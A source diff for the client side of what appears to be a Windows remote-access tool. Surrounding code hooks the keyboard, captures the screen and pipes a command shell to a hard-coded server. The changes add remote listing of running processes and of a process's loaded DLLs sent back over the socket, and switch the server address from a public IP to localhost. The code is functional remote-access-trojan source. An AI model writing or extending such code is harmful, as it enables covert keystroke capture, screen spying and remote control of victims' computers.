@@ -9,20 +9,13 @@
 #pragma comment(lib,"ws2_32.lib")
 #include"DATA.h"
 #include<thread>
+#include<TlHelp32.h>
 #pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
 using namespace std;
 int mykeyboardhook(HWND hwnd);
 
 #define MAX_LOADSTRING 100
-#pragma pack(push)
-#pragma pack(1)
-struct screendata
-{
-    unsigned int width; //屏幕宽
-    unsigned int height;    //屏幕高
-    char data[];
-};
-#pragma pack(pop)
+
 
 // 全局变量:
 HINSTANCE hInst;                                // 当前实例
@@ -42,6 +35,7 @@ HANDLE cmdhwritepipe;
 HANDLE myhreadpipe;
 
 SOCKET s;
+DWORD dwpid;
 
 DWORD WINAPI heartbeatthread(LPVOID lparam)
 {
@@ -246,8 +240,54 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
                 sendcapture(s);
             }
 
+            //进程遍历
+            else if (drbuf.type == SERVER_PROCESS_GET)
+            {
+
+                HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+                PROCESSENTRY32 pe32 = { 0 };
+                pe32.dwSize = sizeof(PROCESSENTRY32);
+                bool bret = Process32First(hsnap, &pe32);
+
+                senddata(s, CLIENT_PROCESS_BACK, (char*)&pe32, pe32.dwSize); 
+
+                while (bret)
+                {
+                    bret = Process32Next(hsnap, &pe32);
+
+                    senddata(s, CLIENT_PROCESS_BACK, (char*)&pe32, pe32.dwSize);
+                }
+
+            }
+
+            //dll查看
+            else if (drbuf.type == SERVER_DLLLIST_VIEW)
+            {
+                dwpid = *(DWORD*)pdata;
+
+                HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwpid);
+
+                MODULEENTRY32 module32 = { 0 };
+                module32.dwSize = sizeof(MODULEENTRY32);
+
+                bret = Module32First(hsnap, &module32);
+
+                senddata(s, CLIENT_DLLDATA_BACK, (char*)&module32, module32.dwSize);
+
+                while (bret)
+                {
+                    bret = Module32Next(hsnap, &module32);
+
+                    senddata(s, CLIENT_DLLDATA_BACK, (char*)&module32, module32.dwSize);
+                }
+            }
         }
-        if (pdata != NULL) delete [] pdata;
+        if (pdata != NULL)
+        {
+            delete[] pdata;
+            pdata = NULL;
+        }
 
         if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
         {
@@ -364,8 +404,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         &st,
         &pi
         );
-    Sleep(300);
-
     
     std::thread mainthread([&] {
 
@@ -379,7 +417,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
             addr.sin_family = AF_INET;
 
 
-            addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
+            addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
             addr.sin_port = htons(10087);
 
             connect(s, (sockaddr*)&addr, length);
